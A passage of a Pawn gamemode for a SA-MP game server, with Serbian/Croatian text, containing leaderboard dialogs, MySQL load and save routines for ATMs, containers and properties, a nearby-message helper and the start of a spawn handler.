		            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

		            if( is_online == 0 )
					{
						cache_get_field_content( i, "last_login", last_login, mSQL, 22 );

						format( globalstring, 150, "{FFFFFF}%s\t%d\t{FF0000}%s\n", p_name, hourss, last_login );
						strcat( DialogStrgEx, globalstring );
					}
					else
					{
						new id = GetPlayerIdFromName(p_name);

		            	format( globalstring, 150, "{FFFFFF}[%d] %s%s\t%d\t{00FF00}Online\n", id, (id == playerid) ? ("{4282C0}") : ("{FFFFFF}"), p_name, hourss);
						strcat( DialogStrgEx, globalstring );
					}
				}
				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Lista najsmrtonosnijih(TDM):", DialogStrgEx, "OK", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		    }
		    else SendErrorMessage( playerid, "Nema kreiranih accounta u bazi." );
		}
		case 6:
		{
			//event
			new rows, 
		    	fields, 
		    	p_name[ 24 ], 
		    	last_login[ 22 ], 
		    	hourss, 
		    	is_online;

		    cache_get_data( rows, fields, mSQL );

		    if( rows )
			{
		        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		        strcat( DialogStrgEx, "{FFFFFF}Name\t{FFFFFF}Wins\t{FFFFFF}Online\n" );

		        for( new i = 0; i < rows; i++ )
				{
		            hourss = cache_get_field_content_int( i, "event_first_place" );
		            is_online = cache_get_field_content_int( i, "isonline" );
		            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

		            if( is_online == 0 )
					{
						cache_get_field_content( i, "last_login", last_login, mSQL, 22 );

						format( globalstring, 150, "{FFFFFF}%s\t%d\t{FF0000}%s\n", p_name, hourss, last_login );
						strcat( DialogStrgEx, globalstring );
					}
					else
					{
						new id = GetPlayerIdFromName(p_name);

		            	format( globalstring, 150, "{FFFFFF}[%d] %s%s\t%d\t{00FF00}Online\n", id, (id == playerid) ? ("{4282C0}") : ("{FFFFFF}"), p_name, hourss);
						strcat( DialogStrgEx, globalstring );
					}
				}
				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Lista najvise osvojenih evenata:", DialogStrgEx, "OK", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		    }
		    else SendErrorMessage( playerid, "Nema kreiranih accounta u bazi." );
		}
		case 7:
		{
			//poklon
			new rows, 
		    	fields, 
		    	p_name[ 24 ], 
		    	last_login[ 22 ], 
		    	hourss, 
		    	is_online;

		    cache_get_data( rows, fields, mSQL );

		    if( rows )
			{
		        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		        strcat( DialogStrgEx, "{FFFFFF}Name\t{FFFFFF}Gifts\t{FFFFFF}Online\n" );

		        for( new i = 0; i < rows; i++ )
				{
		            hourss = cache_get_field_content_int( i, "gift" );
		            is_online = cache_get_field_content_int( i, "isonline" );
		            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

		            if( is_online == 0 )
					{
						cache_get_field_content( i, "last_login", last_login, mSQL, 22 );

						format( globalstring, 150, "{FFFFFF}%s\t%d\t{FF0000}%s\n", p_name, hourss, last_login );
						strcat( DialogStrgEx, globalstring );
					}
					else
					{
						new id = GetPlayerIdFromName(p_name);

		            	format( globalstring, 150, "{FFFFFF}[%d] %s%s\t%d\t{00FF00}Online\n", id, (id == playerid) ? ("{4282C0}") : ("{FFFFFF}"), p_name, hourss);
						strcat( DialogStrgEx, globalstring );
					}
				}
				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Lista najvise otvorenih poklona:", DialogStrgEx, "OK", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		    }
		    else SendErrorMessage( playerid, "Nema kreiranih accounta u bazi." );
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public mSQL_CreateATM( createID )
{
	static q[300];
    mysql_format( mSQL, q, sizeof( q ),

		"INSERT INTO `atms` ( atmPos1, atmPos2, atmPos3, atmPos4, atmPos5, atmPos6, atmPreseceneZice, atmProbijenBios, atmVremeDoRoba ) \
	 	VALUES( '%f', '%f', '%f', '%f', '%f', '%f', '0', '0', '0' )",

        atmInfo[ createID ][ atmPos ][ 0 ], atmInfo[ createID ][ atmPos ][ 1 ], atmInfo[ createID ][ atmPos ][ 2 ],
        atmInfo[ createID ][ atmPos ][ 3 ], atmInfo[ createID ][ atmPos ][ 4 ], atmInfo[ createID ][ atmPos ][ 5 ] );

    mysql_pquery( mSQL, q, "OnATMCreated", "i", createID );
	return 1;
}
_:public OnATMCreated( createID )
{
	atmInfo[ createID ][ atmSQLID ] = cache_insert_id();
	return 1;
}
// --
_:public OnATMsLoad( )
{
	new rows, fields, thisID;
    cache_get_data( rows, fields, mSQL );

	if( rows )
	{
		for( new i = 0; i < rows; i ++ )
		{
			thisID = Iter_Free(iter_ATM);

            atmInfo[ thisID ][ atmSQLID ] 			= cache_get_field_content_int( i, "atmSQLID" );
            atmInfo[ thisID ][ atmPos ][ 0 ] 		= cache_get_field_content_float( i, "atmPos1" );
            atmInfo[ thisID ][ atmPos ][ 1 ] 		= cache_get_field_content_float( i, "atmPos2" );
            atmInfo[ thisID ][ atmPos ][ 2 ] 		= cache_get_field_content_float( i, "atmPos3" );
            atmInfo[ thisID ][ atmPos ][ 3 ] 		= cache_get_field_content_float( i, "atmPos4" );
            atmInfo[ thisID ][ atmPos ][ 4 ] 		= cache_get_field_content_float( i, "atmPos5" );
            atmInfo[ thisID ][ atmPos ][ 5 ] 		= cache_get_field_content_float( i, "atmPos6" );
            atmInfo[ thisID ][ atmPreseceneZice ] 	= bool:cache_get_field_content_int( i, "atmPreseceneZice" );
            atmInfo[ thisID ][ atmProbijenBios ] 	= bool:cache_get_field_content_int( i, "atmProbijenBios" );
            atmInfo[ thisID ][ atmVremeDoRoba ]		= cache_get_field_content_int( i, "atmVremeDoRoba" );

        	atmInfo[ thisID ][ atmObject ] = CreateDynamicObject(2942, atmInfo[ thisID ][ atmPos ][ 0 ], atmInfo[ thisID ][ atmPos ][ 1 ], atmInfo[ thisID ][ atmPos ][ 2 ], atmInfo[ thisID ][ atmPos ][ 3 ], atmInfo[ thisID ][ atmPos ][ 4 ], atmInfo[ thisID ][ atmPos ][ 5 ] );
			atmInfo[ thisID ][ atmText3D ] = CreateDynamic3DTextLabel( "ATM\n\n\
																		Da koristite bankomat kucajte {FFFFFF}\"/atm\"\n\
																		{4282C0}Da opljackate bankomat kucajte {FFFFFF}\"/robatm\"", 0x4282C0FF, atmInfo[ thisID ][atmPos][ 0 ], atmInfo[ thisID ][atmPos][ 1 ], atmInfo[ thisID ][atmPos][ 2 ], 10.0, IPI, IVI, 0, -1, -1 );

			Iter_Add(iter_ATM, thisID);
		}

	}
	printf("(U) SQL: Ucitao - Bankomati(%d)", rows);
    return 1;
}
// --
_:public SacuvajATM( id )
{
    static q[400];
	mysql_format(mSQL, q, sizeof(q),
	    "UPDATE `atms` SET `atmPos1` = '%f', `atmPos2` = '%f', `atmPos3` = '%f', `atmPos4` = '%f', `atmPos5` = '%f', `atmPos6` = '%f',\
							`atmPreseceneZice` = '%d', `atmProbijenBios` = '%d', `atmVremeDoRoba` = '%d'\
		WHERE `atmSQLID` = '%d'",

		atmInfo[id][atmPos][0], atmInfo[id][atmPos][1], atmInfo[id][atmPos][2], atmInfo[id][atmPos][3], atmInfo[id][atmPos][4], atmInfo[id][atmPos][5],
		atmInfo[id][atmPreseceneZice], atmInfo[id][atmProbijenBios], atmInfo[id][atmVremeDoRoba], atmInfo[id][atmSQLID]);

	mysql_tquery(mSQL, q);
    return 1;
}
//------------------------------------------------------------------------------
_:public mSQL_CreateContainer( createID )
{
	static q[ 300 ];
    mysql_format( mSQL, q, sizeof( q ), "INSERT INTO `containers` ( koObjPos1, koObjPos2, koObjPos3, koObjRot1, koObjRot2, koObjRot3 )\
		VALUES( '%f', '%f', '%f', '%f', '%f', '%f')",

        KontInfo[ createID ][ koObjPos ][ 0 ], KontInfo[ createID ][ koObjPos ][ 1 ], KontInfo[ createID ][ koObjPos ][ 2 ],
        KontInfo[ createID ][ koObjRot ][ 0 ], KontInfo[ createID ][ koObjRot ][ 1 ], KontInfo[ createID ][ koObjRot ][ 2 ] );

    mysql_pquery( mSQL, q, "OnContainerCreated", "i", createID );
	return 1;
}
_:public OnContainerCreated( createID )
{
	KontInfo[ createID ][ koSQLID ] = cache_insert_id();
	return 1;
}
//--
_:public OnContainersLoad( )
{
    new rows, fields, thisID;
    cache_get_data( rows, fields, mSQL );

	if( rows )
	{
		for( new i = 0; i < rows; i ++ )
		{
			thisID = Iter_Free(iter_Kont);

            KontInfo[ thisID ][ koSQLID ] 			= cache_get_field_content_int( i, "koSQLID" );
            KontInfo[ thisID ][ koObjPos ][ 0 ] 	= cache_get_field_content_float( i, "koObjPos1" );
            KontInfo[ thisID ][ koObjPos ][ 1 ] 	= cache_get_field_content_float( i, "koObjPos2" );
            KontInfo[ thisID ][ koObjPos ][ 2 ] 	= cache_get_field_content_float( i, "koObjPos3" );
            KontInfo[ thisID ][ koObjRot ][ 0 ] 	= cache_get_field_content_float( i, "koObjRot1" );
            KontInfo[ thisID ][ koObjRot ][ 1 ] 	= cache_get_field_content_float( i, "koObjRot2" );
            KontInfo[ thisID ][ koObjRot ][ 2 ] 	= cache_get_field_content_float( i, "koObjRot3" );

			KontInfo[ thisID ][ koObjID ] = CreateDynamicObject(1345, KontInfo[ thisID ][ koObjPos ][ 0 ], KontInfo[ thisID ][ koObjPos ][ 1 ], KontInfo[ thisID ][ koObjPos ][ 2 ], KontInfo[ thisID ][ koObjRot ][ 0 ], KontInfo[ thisID ][ koObjRot ][ 1 ], KontInfo[ thisID ][ koObjRot ][ 2 ] );
    		ServerInfo[ BrojKontejnera ]++;

    		Iter_Add(iter_Kont, thisID);
		}
	}
	printf("(U) SQL: Ucitao - Kontejneri(%d)", rows);
    return 1;
}
// --
_:public SacuvajKont( id )
{
    static q[250];
	mysql_format(mSQL, q, sizeof(q),
	    "UPDATE `containers` SET `koObjPos1` = '%f', `koObjPos2` = '%f', `koObjPos3` = '%f', `koObjRot1` = '%f', `koObjRot2` = '%f', `koObjRot3` = '%f'\
		WHERE `koSQLID` = '%d'",

		KontInfo[id][koObjPos][0], KontInfo[id][koObjPos][1], KontInfo[id][koObjPos][2], KontInfo[id][koObjRot][0], KontInfo[id][koObjRot][1], KontInfo[id][koObjRot][2], KontInfo[id][koSQLID]);

	mysql_tquery(mSQL, q);
    return 1;
}
//------------------------------------------------------------------------------
_:public mSQL_CreateProperty( createID )
{
	static q[500];
    mysql_format( mSQL, q, sizeof(q),
		"INSERT INTO `propertys` (iUsage, iEnter1, iEnter2, iEnter3, iExit1, iExit2, iExit3, iPrice, iInterior, iVW, iVrsta, iLevel, iAdress) \
		VALUES('%d', '%f', '%f', '%f', '%f', '%f', '%f', '%d', '%d', '%d', '%d', '%d', '%e')",
        II[createID][iUsage], II[createID][iEnter][0], II[createID][iEnter][1], II[createID][iEnter][2], II[createID][iExit][0], II[createID][iExit][1], II[createID][iExit][2],
		II[createID][iPrice], II[createID][iInterior], II[createID][iVW], II[createID][iVrsta], II[createID][iLevel], II[createID][iAdress]);
    mysql_pquery( mSQL, q, "OnPropertyCreated", "i", createID );

    Iter_Add(iter_Imovina, createID);
	return 1;
}
_:public OnPropertyCreated( createID )
{
	II[ createID ][ iSQLID ] = cache_insert_id();
	return 1;
}
// --
_:public OnPropertysLoad( )
{
	new rows, fields, im, string[250];
    cache_get_data( rows, fields, mSQL );

	if( rows )
	{
		for( new i = 0; i < rows; i ++ )
		{
		    im = Iter_Free(iter_Imovina);

            II[ im ][ iSQLID ] 						= cache_get_field_content_int( i, "iSQLID" );
            II[ im ][ iOwned ] 						= cache_get_field_content_int( i, "iOwned" );
            II[ im ][ iOnAuction ] 					= bool:cache_get_field_content_int( i, "iOnAuction" );
            II[ im ][ iOwnerSQLID ] 				= cache_get_field_content_int( i, "iOwnerSQLID" );
            II[ im ][ iUsage ] 						= cache_get_field_content_int( i, "iUsage" );
            II[ im ][ iEnter ][0] 					= cache_get_field_content_float( i, "iEnter1" );
            II[ im ][ iEnter ][1] 					= cache_get_field_content_float( i, "iEnter2" );
            II[ im ][ iEnter ][2] 					= cache_get_field_content_float( i, "iEnter3" );
            II[ im ][ iExit ][0] 					= cache_get_field_content_float( i, "iExit1" );
            II[ im ][ iExit ][1] 					= cache_get_field_content_float( i, "iExit2" );
            II[ im ][ iExit ][2] 					= cache_get_field_content_float( i, "iExit3" );
            II[ im ][ iPrice ] 						= cache_get_field_content_int( i, "iPrice" );
            II[ im ][ iLocked ] 					= cache_get_field_content_int( i, "iLocked" );
            II[ im ][ iInterior ] 					= cache_get_field_content_int( i, "iInterior" );
            II[ im ][ iVW ] 						= cache_get_field_content_int( i, "iVW" );
            II[ im ][ iVrsta ] 						= cache_get_field_content_int( i, "iVrsta" );
            II[ im ][ iOruzje ][ 0 ] 				= cache_get_field_content_int( i, "iOruzje1" );
            II[ im ][ iOruzje ][ 1 ] 				= cache_get_field_content_int( i, "iOruzje2" );
            II[ im ][ iOruzje ][ 2 ] 				= cache_get_field_content_int( i, "iOruzje3" );
            II[ im ][ iOruzje ][ 3 ] 				= cache_get_field_content_int( i, "iOruzje4" );
            II[ im ][ iMunicija ][ 0 ] 				= cache_get_field_content_int( i, "iMunicija1" );
            II[ im ][ iMunicija ][ 1 ] 				= cache_get_field_content_int( i, "iMunicija2" );
            II[ im ][ iMunicija ][ 2 ] 				= cache_get_field_content_int( i, "iMunicija3" );
            II[ im ][ iMunicija ][ 3 ] 				= cache_get_field_content_int( i, "iMunicija4" );
            II[ im ][ iDrugAmmount ] 				= cache_get_field_content_int( i, "iDrugAmmount" );
            II[ im ][ iDoorLevel ] 					= cache_get_field_content_int( i, "iDoorLevel" );
            II[ im ][ iAlarm ] 						= cache_get_field_content_int( i, "iAlarm" );
            II[ im ][ iLockLevel ] 					= cache_get_field_content_int( i, "iLockLevel" );
            II[ im ][ iTime ] 						= cache_get_field_content_int( i, "iTime" );
            II[ im ][ iLevel ] 						= cache_get_field_content_int( i, "iLevel" );
            II[ im ][ iNeaktivnost ] 				= cache_get_field_content_int( i, "iNeaktivnost" );
            II[ im ][ iRentable ] 					= cache_get_field_content_int( i, "iRentable" );
            II[ im ][ iRentPrice ] 					= cache_get_field_content_int( i, "iRentPrice" );
            II[ im ][ iRentovano ] 					= cache_get_field_content_int( i, "iRentovano" );
            II[ im ][ iMoney ] 						= cache_get_field_content_int( i, "iMoney" );
            II[ im ][ iMats ] 						= cache_get_field_content_int( i, "iMats" );

            cache_get_field_content( i, "iOwner", II[ im ][ iOwner ], mSQL, 24 );
            cache_get_field_content( i, "iAdress", II[ im ][ iAdress ], mSQL, 50 );

			II[ im ][ iVW ] = im;

	        if( II[ im ][ iUsage ] == IMOVINA_KUCA )
			{
				if( II[ im ][ iOwned ] == 0 )
				{
					if(!II[im][iOnAuction])
					{
						format( string, sizeof( string ),
							"{4282C0}(KUCA - [%d])\n\
							Vrsta: {FFFFFF}%s\n\
							{4282C0}Cena: {FFFFFF}$%d\n\
							{4282C0}Level: {FFFFFF}%d\n\
							{4282C0}Adresa: {FFFFFF}%s\n\
							{4282C0}[ /kupiimovinu ]", im, getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
					}
					else
					{
						format( string, sizeof( string ),
							"{4282C0}(KUCA - [%d])\n\
							Vrsta: {FFFFFF}%s\n\
							{4282C0}Cena: {FFFFFF}$%d\n\
							{4282C0}Level: {FFFFFF}%d\n\
							{4282C0}Adresa: {FFFFFF}%s\n\
							{4282C0}[ {00FF00}NA AUKCIJI {4282C0}]", im, getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
					}
					ImovinaPickup[ im ] = CreateDynamicPickup(1273, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 0, 0, .priority = 26 );
			        ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
				}
				else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 0 )
				{
					format( string, sizeof( string ),
						"{4282C0}(KUCA - [%d])\n\
						{4282C0}Vlasnik: {FFFFFF}%s\n\
						{4282C0}Adresa: {FFFFFF}%s\n\
						{4282C0}Vrsta: {FFFFFF}%s\n\
						{4282C0}Neaktivnost: {FFFFFF}%dh\n\
						{4282C0}'ENTER' za ulaz u imovinu.", im, II[ im ][ iOwner ], II[ im ][ iAdress ], getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iNeaktivnost ] );
					ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 0, 0, .priority = 26 );
			        ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
				}
				else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 1 )
				{
					format( string, sizeof( string ),
						"{4282C0}(KUCA - [%d])\n\
						Vlasnik: {FFFFFF}%s\n\
						{4282C0}Adresa: {FFFFFF}%s\n\
						{4282C0}Vrsta: {FFFFFF}%s\n\
						{4282C0}Neaktivnost: {FFFFFF}%dh\n\
						{4282C0}Cena renta: {FFFFFF}$%d\n\
						{4282C0}[ /rentroom ]", im, II[ im ][ iOwner ], II[ im ][ iAdress ], getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iNeaktivnost ], II[ im ][ iRentPrice ] );
					ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 0, 0, .priority = 26 );
			        ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
				}
			}
			else if( II[ im ][ iUsage ] == IMOVINA_STAN )
			{
				if( II[ im ][ iOwned ] == 0 )
				{
					if(!II[im][iOnAuction])
					{
						format( string, sizeof( string ),
							"{FF0000}(STAN - [%d])\n\
							Cena: {FFFFFF}$%d\n\
							{FF0000}Level: {FFFFFF}%d\n\
							{FF0000}Adresa: {FFFFFF}%s\n\
							{FF0000}[ /kupiimovinu ]", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
					}
					else
					{
						format( string, sizeof( string ),
							"{FF0000}(STAN - [%d])\n\
							Cena: {FFFFFF}$%d\n\
							{FF0000}Level: {FFFFFF}%d\n\
							{FF0000}Adresa: {FFFFFF}%s\n\
							{FF0000}[ {00FF00}NA AUKCIJI {FF0000}]", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
					}
					ImovinaPickup[ im ] = CreateDynamicPickup(1272, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 0, 0, .priority = 26 );
			        ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
				}
				else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 0 )
				{
					format( string, sizeof( string ),
						"{FF0000}(STAN - [%d])\n\
						Vlasnik: {FFFFFF}%s\n\
						{FF0000}Adresa: {FFFFFF}%s\n\
						{FF0000}Neaktivnost: {FFFFFF}%dh\n\
						{FF0000}'ENTER' za ulaz u imovinu.", im, II[ im ][ iOwner ], II[ im ][ iAdress ], II[ im ][ iNeaktivnost ] );
					ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 0, 0, .priority = 26 );
			        ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
				}
				else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 1 )
				{
					format( string, sizeof( string ),
						"{FF0000}(STAN - [%d])\n\
						Vlasnik: {FFFFFF}%s\n\
						{FF0000}Adresa: {FFFFFF}%s\n\
						{FF0000}Neaktivnost: {FFFFFF}%dh\n\
						{FF0000}Cena renta: {FFFFFF}$%d\n\
						{FF0000}[ /rentroom ]", im, II[ im ][ iOwner ], II[ im ][ iAdress ], II[ im ][ iNeaktivnost ], II[ im ][ iRentPrice ] );
					ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 0, 0, .priority = 26 );
			        ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
				}
			}
			else if( II[ im ][ iUsage ] == IMOVINA_VIKENDICA )
			{
			    if( II[ im ][ iOwned ] == 0 )
				{
					if(!II[im][iOnAuction])
					{
						format( string, sizeof( string ),
							"{7B8000}(VIKENDICA - [%d])\n\
							Cena: {FFFFFF}$%d\n\
							{7B8000}Level: {FFFFFF}%d\n\
							{7B8000}Adresa: {FFFFFF}%s\n\
							{7B8000}[ /kupiimovinu ]", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
					}
					else
					{
						format( string, sizeof( string ),
							"{7B8000}(VIKENDICA - [%d])\n\
							Cena: {FFFFFF}$%d\n\
							{7B8000}Level: {FFFFFF}%d\n\
							{7B8000}Adresa: {FFFFFF}%s\n\
							{7B8000}[ {00FF00}NA AUKCIJI {7B8000}]", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
					}
					ImovinaPickup[ im ] = CreateDynamicPickup(1318, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 0, 0, .priority = 26 );
			        ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
			    }
				else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 0 )
				{
		            format( string, sizeof( string ),
						"{7B8000}(VIKENDICA - [%d])\n\
						Vlasnik: {FFFFFF}%s\n\
						{7B8000}Adresa: {FFFFFF}%s\n\
						{7B8000}Neaktivnost: {FFFFFF}%dh\n\
						{7B8000}'ENTER' za ulaz u imovinu.", im, II[ im ][ iOwner ], II[ im ][ iAdress ], II[ im ][ iNeaktivnost ] );
					ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 0, 0, .priority = 26 );
			        ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
				}
		        else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 1 )
				{
		            format( string, sizeof( string ),
						"{7B8000}(VIKENDICA - [%d])\n\
						Vlasnik: {FFFFFF}%s\n\
						{7B8000}Adresa: {FFFFFF}%s\n\
						{7B8000}Neaktivnost: {FFFFFF}%dh\n\
						{7B8000}Cena renta: {FFFFFF}$%d\n\
						{7B8000}[ /rentroom ]", im, II[ im ][ iOwner ], II[ im ][ iAdress ], II[ im ][ iNeaktivnost ], II[ im ][ iRentPrice ] );
					ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 0, 0, .priority = 26 );
			        ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
				}
			}
	        ServerInfo[ BrojImovina ]++;
	        Iter_Add(iter_Imovina, im);
		}
	}
	printf("(U) SQL: Ucitao - Imovina(%d)", rows);
    return 1;
}
// --
_:public SaveProperty( id )
{
	static q[1300];
	mysql_format(mSQL, q, 1300,

	    "UPDATE `propertys` SET\
	        `iOwnerSQLID` = '%d', `iOwned` = '%d', `iOnAuction` = '%d', `iOwner` = '%s', `iUsage` = '%d', `iEnter1` = '%f', `iEnter2` = '%f', `iEnter3` = '%f', `iExit1` = '%f', `iExit2` = '%f', `iExit3` = '%f',\
	        `iPrice` = '%d', `iLocked` = '%d', `iInterior` = '%d', `iVW` = '%d', `iVrsta` = '%d',\
	        `iOruzje1` = '%d', `iOruzje2` = '%d', `iOruzje3` = '%d', `iOruzje4` = '%d', `iMunicija1` = '%d', `iMunicija2` = '%d', `iMunicija3` = '%d', `iMunicija4` = '%d',\
	        `iDrugAmmount` = '%d',\
	        `iDoorLevel` = '%d', `iAlarm` = '%d', `iLockLevel` = '%d', `iTime` = '%d', `iLevel` = '%d', `iAdress` = '%s', `iNeaktivnost` = '%d', `iRentPrice` = '%d',\
	        `iRentovano` = '%d', `iMoney` = '%d', `iMats` = '%d'\
		WHERE `iSQLID` = '%d'",

	II[id][iOwnerSQLID], II[id][iOwned], II[id][iOnAuction], II[id][iOwner], II[id][iUsage], II[id][iEnter][0], II[id][iEnter][1], II[id][iEnter][2], II[id][iExit][0], II[id][iExit][1], II[id][iExit][2],
	II[id][iPrice], II[id][iLocked], II[id][iInterior], II[id][iVW], II[id][iVrsta],
 	II[id][iOruzje][0], II[id][iOruzje][1], II[id][iOruzje][2], II[id][iOruzje][3], II[id][iMunicija][0], II[id][iMunicija][1], II[id][iMunicija][2], II[id][iMunicija][3],
 	II[id][iDrugAmmount],
 	II[id][iDoorLevel], II[id][iAlarm], II[id][iLockLevel], II[id][iTime], II[id][iLevel], II[id][iAdress], II[id][iNeaktivnost], II[id][iRentPrice],
 	II[id][iRentovano], II[id][iMoney], II[id][iMats], II[id][iSQLID]);

	mysql_tquery(mSQL, q);
	return 1;
}
//------------------------------------------------------------------------------
SendNearbyMessage(playerid, Float:radius, color, const str[], {Float,_}:...)
{
	static
	    args,
	    start,
	    end,
	    string[144];

	#emit LOAD.S.pri 8
	#emit STOR.pri args

	if(args > 16)
	{
		#emit ADDR.pri str
		#emit STOR.pri start

	    for(end = start + (args - 16); end > start; end -= 4)
		{
	        #emit LREF.pri end
	        #emit PUSH.pri
		}
		#emit PUSH.S str
		#emit PUSH.C 144
		#emit PUSH.C string

		#emit LOAD.S.pri 8
		#emit CONST.alt 4
		#emit SUB
		#emit PUSH.pri

		#emit SYSREQ.C format
		#emit LCTRL 5
		#emit SCTRL 4

        foreach(new i : Player)
		{
			if(IsPlayerNearPlayer(radius, playerid, i)) 
			{
  				SendClientMessage(i, color, string);
			}
		}
		return 1;
	}
	foreach(new i : Player)
	{
		if(IsPlayerNearPlayer(radius, playerid, i))
		{
			SendClientMessage(i, color, str);
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public SkiniSnegGrudavnje( playerid )
{
    DestroyDynamicObject( Obj[ playerid ] );
	AlreadyShooted[ playerid ] = false;
}
//------------------------------------------------------------------------------
_:public SlobodnoSada(playerid)
{
	if(PlayerCP[playerid] == 0) SMG_TogglePlayerControllable(playerid, true);
}
//------------------------------------------------------------------------------
_:public PostaviSpawn( playerid )
{
    new OrgID = PlayerInfo[ playerid ][ xClan ];
    if( IsPlayerConnected( playerid ) )
	{
 		if( PlayerInfo[ playerid ][ xZatvor ] == JAIL )
		{
  			new rand = random( sizeof( RandomZatvor ) );
			SMG_SetPlayerPos( playerid, RandomZatvor[ rand ][ 0 ], RandomZatvor[ rand ][ 1 ],RandomZatvor[ rand ][ 2 ] );
			UcitajObjekte( playerid );
			SendClientMessage( playerid, CRVENA, "(ZATVOR): Nedovrsena zatvorska kazna, natrag u zatvor.");
			SetCameraBehindPlayer( playerid );
			SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 0 );
		}
		else if( PlayerInfo[ playerid ][ xZatvor ] == PRISON )
		{
			SMG_SetPlayerPos( playerid, 268.5777, 1857.9351, 9.8133 );
			UcitajObjekte( playerid );
			SendClientMessage( playerid, CRVENA, "(ZATVOR): Nedovrsena zatvorska kazna, natrag u prison.");
			SetCameraBehindPlayer( playerid );
			SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 1 );
			SetPlayerWorldBounds( playerid, 337.5694, 101.5826, 1940.9759, 1798.7453 );
		}
		else
		{
			new rand = random( sizeof( SpawnAerodrom ) );
		    switch(PlayerInfo[playerid][xSpawn])
		    {
		        case SPAWN_ADMIN:
